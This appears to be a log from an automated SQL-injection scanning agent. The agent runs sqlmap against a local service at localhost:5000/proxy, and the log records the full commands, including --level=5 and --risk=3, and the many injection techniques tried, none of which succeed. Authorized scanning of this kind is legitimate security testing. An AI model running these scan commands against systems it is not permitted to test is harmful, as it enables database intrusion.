2025-09-26 18:57:16,608 - INFO - |_ -| . [)]     | .'| . |
2025-09-26 18:57:16,608 - INFO - |___|_  [.]_|_|_|__,|  _|
2025-09-26 18:57:16,608 - INFO -       |_|V...       |_|   https://sqlmap.org
2025-09-26 18:57:16,608 - INFO - 
2025-09-26 18:57:16,666 - INFO - [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
2025-09-26 18:57:16,668 - INFO - 
2025-09-26 18:57:16,669 - INFO - [*] starting @ 18:57:16 /2025-09-26/
2025-09-26 18:57:16,671 - INFO - 
2025-09-26 18:57:19,009 - INFO - [18:57:18] [WARNING] you've provided target URL without any GET parameters (e.g. 'http://www.site.com/article.php?id=1') and without providing any POST parameters through option '--data'
2025-09-26 18:57:19,009 - INFO - do you want to try URI injections in the target URL itself? [Y/n/q] Y
2025-09-26 18:57:19,009 - INFO - [18:57:19] [INFO] flushing session file
2025-09-26 18:57:19,019 - INFO - [18:57:19] [INFO] testing connection to the target URL
2025-09-26 18:57:19,129 - INFO - [18:57:19] [WARNING] the web server responded with an HTTP error code (400) which could interfere with the results of the tests
2025-09-26 18:57:19,150 - INFO - [18:57:19] [INFO] checking if the target is protected by some kind of WAF/IPS
2025-09-26 18:57:19,173 - INFO - [18:57:19] [INFO] testing if the target URL content is stable
2025-09-26 18:57:19,537 - INFO - [18:57:19] [INFO] target URL content is stable
2025-09-26 18:57:19,537 - INFO - [18:57:19] [INFO] testing if URI parameter '#1*' is dynamic
2025-09-26 18:57:19,581 - INFO - [18:57:19] [INFO] URI parameter '#1*' appears to be dynamic
2025-09-26 18:57:19,603 - INFO - [18:57:19] [WARNING] heuristic (basic) test shows that URI parameter '#1*' might not be injectable
2025-09-26 18:57:19,620 - INFO - [18:57:19] [INFO] testing for SQL injection on URI parameter '#1*'
2025-09-26 18:57:19,679 - INFO - [18:57:19] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
2025-09-26 18:57:19,785 - INFO - [18:57:19] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
2025-09-26 18:57:19,821 - INFO - [18:57:19] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
2025-09-26 18:57:19,869 - INFO - [18:57:19] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
2025-09-26 18:57:19,915 - INFO - [18:57:19] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
2025-09-26 18:57:19,977 - INFO - [18:57:19] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
2025-09-26 18:57:20,042 - INFO - [18:57:20] [INFO] testing 'Generic inline queries'
2025-09-26 18:57:20,046 - INFO - [18:57:20] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
2025-09-26 18:57:20,110 - INFO - [18:57:20] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
2025-09-26 18:57:20,151 - INFO - [18:57:20] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
2025-09-26 18:57:20,183 - INFO - [18:57:20] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
2025-09-26 18:57:20,247 - INFO - [18:57:20] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
2025-09-26 18:57:20,301 - INFO - [18:57:20] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
2025-09-26 18:57:20,349 - INFO - [18:57:20] [INFO] testing 'Oracle AND time-based blind'
2025-09-26 18:57:20,405 - INFO - it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
2025-09-26 18:57:20,405 - INFO - [18:57:20] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
2025-09-26 18:57:20,460 - INFO - [18:57:20] [WARNING] URI parameter '#1*' does not seem to be injectable
2025-09-26 18:57:20,462 - INFO - [18:57:20] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'
2025-09-26 18:57:20,463 - INFO - [18:57:20] [WARNING] HTTP error codes detected during run:
2025-09-26 18:57:20,465 - INFO - 400 (Bad Request) - 3 times, 404 (Not Found) - 73 times
2025-09-26 18:57:20,465 - INFO - 
2025-09-26 18:57:20,465 - INFO - [*] ending @ 18:57:20 /2025-09-26/
2025-09-26 18:57:20,466 - INFO - 

-------------------- EXECUTING COMMAND --------------------
'C:\Users\Ronald Wilson\AppData\Local\Programs\Python\Python311\python.exe' 'F:\disruptiq-notes\sqlmap-dev\sqlmap.py' --batch --flush-session -u http://localhost:5000/proxy
--------------------------------------------------
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.9.9.4#dev}
|_ -| . [)]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 18:57:16 /2025-09-26/

[18:57:18] [WARNING] you've provided target URL without any GET parameters (e.g. 'http://www.site.com/article.php?id=1') and without providing any POST parameters through option '--data'
do you want to try URI injections in the target URL itself? [Y/n/q] Y
[18:57:19] [INFO] flushing session file
[18:57:19] [INFO] testing connection to the target URL
[18:57:19] [WARNING] the web server responded with an HTTP error code (400) which could interfere with the results of the tests
[18:57:19] [INFO] checking if the target is protected by some kind of WAF/IPS
[18:57:19] [INFO] testing if the target URL content is stable
[18:57:19] [INFO] target URL content is stable
[18:57:19] [INFO] testing if URI parameter '#1*' is dynamic
[18:57:19] [INFO] URI parameter '#1*' appears to be dynamic
[18:57:19] [WARNING] heuristic (basic) test shows that URI parameter '#1*' might not be injectable
[18:57:19] [INFO] testing for SQL injection on URI parameter '#1*'
[18:57:19] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[18:57:19] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[18:57:19] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[18:57:19] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[18:57:19] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[18:57:19] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[18:57:20] [INFO] testing 'Generic inline queries'
[18:57:20] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[18:57:20] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[18:57:20] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[18:57:20] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[18:57:20] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[18:57:20] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[18:57:20] [INFO] testing 'Oracle AND time-based blind'
it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
[18:57:20] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[18:57:20] [WARNING] URI parameter '#1*' does not seem to be injectable
[18:57:20] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'
[18:57:20] [WARNING] HTTP error codes detected during run:
400 (Bad Request) - 3 times, 404 (Not Found) - 73 times

[*] ending @ 18:57:20 /2025-09-26/

2025-09-26 18:57:20,607 - INFO - Flushed sqlmap session for http://localhost:5000/proxy (log: attack-logs-dynamic\Proxy_flush.log)
2025-09-26 18:57:20,607 - INFO - Executing command: 'C:\Users\Ronald Wilson\AppData\Local\Programs\Python\Python311\python.exe' 'F:\disruptiq-notes\sqlmap-dev\sqlmap.py' -u 'http://localhost:5000/proxy?url=test' --output-dir 'attack-logs-dynamic\Proxy_sqlmap' --batch --level=5 --risk=3 --threads 5 -p url --technique BU
2025-09-26 18:57:25,272 - INFO -         ___
2025-09-26 18:57:25,273 - INFO -        __H__
2025-09-26 18:57:25,273 - INFO -  ___ ___["]_____ ___ ___  {1.9.9.4#dev}
2025-09-26 18:57:25,273 - INFO - |_ -| . [']     | .'| . |
2025-09-26 18:57:25,273 - INFO - |___|_  ["]_|_|_|__,|  _|
2025-09-26 18:57:25,274 - INFO -       |_|V...       |_|   https://sqlmap.org
2025-09-26 18:57:25,274 - INFO - 
2025-09-26 18:57:25,309 - INFO - [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
2025-09-26 18:57:25,309 - INFO - 
2025-09-26 18:57:25,309 - INFO - [*] starting @ 18:57:25 /2025-09-26/
2025-09-26 18:57:25,310 - INFO - 
2025-09-26 18:57:27,146 - INFO - [18:57:27] [WARNING] using 'F:\disruptiq-notes\sql-injection-agent-from-openapi-spec\sqlmap-agent\attack-logs-dynamic\Proxy_sqlmap' as the output directory
2025-09-26 18:57:27,684 - INFO - [18:57:27] [INFO] testing connection to the target URL
2025-09-26 18:57:27,873 - INFO - [18:57:27] [WARNING] the web server responded with an HTTP error code (500) which could interfere with the results of the tests
2025-09-26 18:57:27,874 - INFO - [18:57:27] [INFO] checking if the target is protected by some kind of WAF/IPS
2025-09-26 18:57:27,909 - INFO - [18:57:27] [INFO] testing if the target URL content is stable
2025-09-26 18:57:28,194 - INFO - [18:57:28] [INFO] target URL content is stable
2025-09-26 18:57:28,299 - INFO - [18:57:28] [WARNING] heuristic (basic) test shows that GET parameter 'url' might not be injectable
2025-09-26 18:57:28,318 - INFO - [18:57:28] [INFO] testing for SQL injection on GET parameter 'url'
2025-09-26 18:57:28,410 - INFO - [18:57:28] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
2025-09-26 18:57:28,432 - INFO - [18:57:28] [WARNING] reflective value(s) found and filtering out
2025-09-26 18:57:29,739 - INFO - [18:57:29] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
2025-09-26 18:57:30,785 - INFO - [18:57:30] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
2025-09-26 18:57:31,945 - INFO - [18:57:31] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
2025-09-26 18:57:33,114 - INFO - [18:57:33] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
2025-09-26 18:57:33,774 - INFO - [18:57:33] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
2025-09-26 18:57:33,994 - INFO - [18:57:33] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
2025-09-26 18:57:34,185 - INFO - [18:57:34] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
2025-09-26 18:57:34,506 - INFO - [18:57:34] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
2025-09-26 18:57:35,117 - INFO - [18:57:35] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
2025-09-26 18:57:35,607 - INFO - [18:57:35] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
2025-09-26 18:57:36,080 - INFO - [18:57:36] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
2025-09-26 18:57:36,632 - INFO - [18:57:36] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
2025-09-26 18:57:37,143 - INFO - [18:57:37] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
2025-09-26 18:57:38,004 - INFO - [18:57:38] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
2025-09-26 18:57:38,906 - INFO - [18:57:38] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
2025-09-26 18:57:39,781 - INFO - [18:57:39] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
2025-09-26 18:57:40,811 - INFO - [18:57:40] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
2025-09-26 18:57:41,774 - INFO - [18:57:41] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
2025-09-26 18:57:42,855 - INFO - [18:57:42] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
2025-09-26 18:57:43,869 - INFO - [18:57:43] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
2025-09-26 18:57:44,964 - INFO - [18:57:44] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'
2025-09-26 18:57:46,016 - INFO - [18:57:46] [INFO] testing 'Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
2025-09-26 18:57:46,881 - INFO - [18:57:46] [INFO] testing 'Oracle OR boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
2025-09-26 18:57:47,800 - INFO - [18:57:47] [INFO] testing 'SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
2025-09-26 18:57:48,813 - INFO - [18:57:48] [INFO] testing 'SQLite OR boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
2025-09-26 18:57:50,011 - INFO - [18:57:50] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
2025-09-26 18:57:50,046 - INFO - [18:57:50] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET)'
2025-09-26 18:57:50,075 - INFO - [18:57:50] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)'
2025-09-26 18:57:50,102 - INFO - [18:57:50] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT)'
2025-09-26 18:57:50,131 - INFO - [18:57:50] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT - original value)'
2025-09-26 18:57:50,178 - INFO - [18:57:50] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int)'
2025-09-26 18:57:50,212 - INFO - [18:57:50] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int - original value)'
2025-09-26 18:57:50,263 - INFO - [18:57:50] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace'
2025-09-26 18:57:50,312 - INFO - [18:57:50] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (original value)'
2025-09-26 18:57:50,358 - INFO - [18:57:50] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES)'
2025-09-26 18:57:50,403 - INFO - [18:57:50] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value)'
2025-09-26 18:57:50,439 - INFO - [18:57:50] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace'
2025-09-26 18:57:50,476 - INFO - [18:57:50] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace (original value)'
2025-09-26 18:57:50,513 - INFO - [18:57:50] [INFO] testing 'Oracle boolean-based blind - Parameter replace'
2025-09-26 18:57:50,548 - INFO - [18:57:50] [INFO] testing 'Oracle boolean-based blind - Parameter replace (original value)'
2025-09-26 18:57:50,581 - INFO - [18:57:50] [INFO] testing 'Informix boolean-based blind - Parameter replace'
2025-09-26 18:57:50,621 - INFO - [18:57:50] [INFO] testing 'Informix boolean-based blind - Parameter replace (original value)'
2025-09-26 18:57:50,649 - INFO - [18:57:50] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace'
2025-09-26 18:57:50,686 - INFO - [18:57:50] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace (original value)'
2025-09-26 18:57:50,720 - INFO - [18:57:50] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
2025-09-26 18:57:50,748 - INFO - [18:57:50] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
2025-09-26 18:57:50,775 - INFO - [18:57:50] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
2025-09-26 18:57:50,805 - INFO - [18:57:50] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
2025-09-26 18:57:50,833 - INFO - [18:57:50] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
2025-09-26 18:57:50,908 - INFO - [18:57:50] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
2025-09-26 18:57:50,968 - INFO - [18:57:50] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
2025-09-26 18:57:50,971 - INFO - [18:57:50] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
2025-09-26 18:57:50,971 - INFO - [18:57:50] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause'
2025-09-26 18:57:51,022 - INFO - [18:57:51] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (original value)'
2025-09-26 18:57:51,072 - INFO - [18:57:51] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (GENERATE_SERIES)'
2025-09-26 18:57:51,113 - INFO - [18:57:51] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause'
2025-09-26 18:57:51,169 - INFO - [18:57:51] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause (original value)'
2025-09-26 18:57:51,229 - INFO - [18:57:51] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause'
2025-09-26 18:57:51,294 - INFO - [18:57:51] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause (original value)'
2025-09-26 18:57:51,349 - INFO - [18:57:51] [INFO] testing 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause'
2025-09-26 18:57:51,421 - INFO - [18:57:51] [INFO] testing 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause (original value)'
2025-09-26 18:57:51,470 - INFO - [18:57:51] [INFO] testing 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause'
2025-09-26 18:57:51,542 - INFO - [18:57:51] [INFO] testing 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause (original value)'
2025-09-26 18:57:51,591 - INFO - [18:57:51] [INFO] testing 'IBM DB2 boolean-based blind - ORDER BY clause'
2025-09-26 18:57:51,645 - INFO - [18:57:51] [INFO] testing 'IBM DB2 boolean-based blind - ORDER BY clause (original value)'
2025-09-26 18:57:51,689 - INFO - [18:57:51] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
2025-09-26 18:57:52,634 - INFO - [18:57:52] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Stacked queries'
2025-09-26 18:57:53,545 - INFO - [18:57:53] [INFO] testing 'MySQL < 5.0 boolean-based blind - Stacked queries'
2025-09-26 18:57:53,553 - INFO - [18:57:53] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries'
2025-09-26 18:57:54,239 - INFO - [18:57:54] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries (GENERATE_SERIES)'
2025-09-26 18:57:54,863 - INFO - [18:57:54] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries (IF)'
2025-09-26 18:57:55,589 - INFO - [18:57:55] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries'
2025-09-26 18:57:56,284 - INFO - [18:57:56] [INFO] testing 'Oracle boolean-based blind - Stacked queries'
2025-09-26 18:57:56,999 - INFO - [18:57:56] [INFO] testing 'Microsoft Access boolean-based blind - Stacked queries'
2025-09-26 18:57:57,740 - INFO - [18:57:57] [INFO] testing 'SAP MaxDB boolean-based blind - Stacked queries'
2025-09-26 18:57:58,516 - INFO - it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
2025-09-26 18:57:58,517 - INFO - [18:57:58] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
2025-09-26 18:57:59,286 - INFO - [18:57:59] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
2025-09-26 18:57:59,808 - INFO - [18:57:59] [INFO] testing 'MySQL UNION query (NULL) - 1 to 10 columns'
2025-09-26 18:58:00,298 - INFO - [18:58:00] [INFO] testing 'MySQL UNION query (random number) - 1 to 10 columns'
2025-09-26 18:58:01,018 - INFO - [18:58:01] [WARNING] GET parameter 'url' does not seem to be injectable
2025-09-26 18:58:01,028 - INFO - [18:58:01] [CRITICAL] all tested parameters do not appear to be injectable. Rerun without providing the option '--technique'. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'
2025-09-26 18:58:01,038 - INFO - [18:58:01] [WARNING] HTTP error codes detected during run:
2025-09-26 18:58:01,046 - INFO - 500 (Internal Server Error) - 2384 times
2025-09-26 18:58:01,047 - INFO - 
2025-09-26 18:58:01,047 - INFO - [*] ending @ 18:58:01 /2025-09-26/
2025-09-26 18:58:01,048 - INFO - 

-------------------- EXECUTING COMMAND --------------------
'C:\Users\Ronald Wilson\AppData\Local\Programs\Python\Python311\python.exe' 'F:\disruptiq-notes\sqlmap-dev\sqlmap.py' -u 'http://localhost:5000/proxy?url=test' --output-dir 'attack-logs-dynamic\Proxy_sqlmap' --batch --level=5 --risk=3 --threads 5 -p url --technique BU
--------------------------------------------------
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.9.9.4#dev}
|_ -| . [']     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 18:57:25 /2025-09-26/

[18:57:27] [WARNING] using 'F:\disruptiq-notes\sql-injection-agent-from-openapi-spec\sqlmap-agent\attack-logs-dynamic\Proxy_sqlmap' as the output directory
[18:57:27] [INFO] testing connection to the target URL
[18:57:27] [WARNING] the web server responded with an HTTP error code (500) which could interfere with the results of the tests
[18:57:27] [INFO] checking if the target is protected by some kind of WAF/IPS
[18:57:27] [INFO] testing if the target URL content is stable
[18:57:28] [INFO] target URL content is stable
[18:57:28] [WARNING] heuristic (basic) test shows that GET parameter 'url' might not be injectable
[18:57:28] [INFO] testing for SQL injection on GET parameter 'url'
[18:57:28] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[18:57:28] [WARNING] reflective value(s) found and filtering out
[18:57:29] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[18:57:30] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[18:57:31] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[18:57:33] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[18:57:33] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
[18:57:33] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
[18:57:34] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
[18:57:34] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[18:57:35] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[18:57:35] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
[18:57:36] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
[18:57:36] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
[18:57:37] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
[18:57:38] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[18:57:38] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[18:57:39] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
[18:57:40] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
[18:57:41] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[18:57:42] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[18:57:43] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
[18:57:44] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'
[18:57:46] [INFO] testing 'Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
[18:57:46] [INFO] testing 'Oracle OR boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
[18:57:47] [INFO] testing 'SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
[18:57:48] [INFO] testing 'SQLite OR boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
[18:57:50] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[18:57:50] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET)'
[18:57:50] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)'
[18:57:50] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT)'
[18:57:50] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT - original value)'
[18:57:50] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int)'
[18:57:50] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int - original value)'
[18:57:50] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace'
[18:57:50] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (original value)'
[18:57:50] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES)'
[18:57:50] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value)'
[18:57:50] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace'
[18:57:50] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace (original value)'
[18:57:50] [INFO] testing 'Oracle boolean-based blind - Parameter replace'
[18:57:50] [INFO] testing 'Oracle boolean-based blind - Parameter replace (original value)'
[18:57:50] [INFO] testing 'Informix boolean-based blind - Parameter replace'
[18:57:50] [INFO] testing 'Informix boolean-based blind - Parameter replace (original value)'
[18:57:50] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace'
[18:57:50] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace (original value)'
[18:57:50] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
[18:57:50] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
[18:57:50] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
[18:57:50] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
[18:57:50] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
[18:57:50] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[18:57:50] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
[18:57:50] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[18:57:50] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause'
[18:57:51] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (original value)'
[18:57:51] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (GENERATE_SERIES)'
[18:57:51] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause'
[18:57:51] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause (original value)'
[18:57:51] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause'
[18:57:51] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[18:57:51] [INFO] testing 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause'
[18:57:51] [INFO] testing 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[18:57:51] [INFO] testing 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause'
[18:57:51] [INFO] testing 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[18:57:51] [INFO] testing 'IBM DB2 boolean-based blind - ORDER BY clause'
